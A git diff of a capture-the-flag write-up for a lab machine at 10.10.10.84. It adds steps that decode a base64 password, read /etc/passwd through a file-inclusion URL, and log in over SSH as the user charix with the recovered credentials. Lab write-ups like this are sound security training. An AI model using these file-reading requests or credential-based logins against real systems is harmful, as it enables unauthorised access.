@@ -40,13 +40,27 @@ Port 80: Apache httpd 2.4.29
 
 + **Firstly**, crack in bash script [here](https://github.com/h4md153v63n/Bash_Scripts/tree/main/base64-multiple-decoder).
 
-+ Decoded form: `Charix!2#4%6&8(0`
-
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a60378d4-e4e3-4d17-bd7f-385c8af1a0d9)
 
 + **Second Alternative**, try this online tool: https://base64-multiple-decode.netlify.app
 
 ![image](https://github.com/h4md153v63n/Bash_Scripts/assets/5091265/27a222f4-dc74-4795-ada0-86bda6fae3b6)
+
++ Get the password of decoded form as `Charix!2#4%6&8(0`
++ Get the users: `http://10.10.10.84/browse.php?file=/etc/passwd`
++ Discovered users: **root**, **toor** and **charix**
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/00e56373-ad34-4087-a00e-7c9efcbf5fae)
+
++ The user should be `charix`:`Charix!2#4%6&8(0`
++ It belongs to Charix. Login ssh into charix account using the discovered credentials.
++ `ssh charix@10.10.10.84`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bd4b9cf9-8dee-4b01-b130-9f79a2776d93)
+
++ Get the user shell and user flag.
+
+  
 
 
 # References & Alternatives:
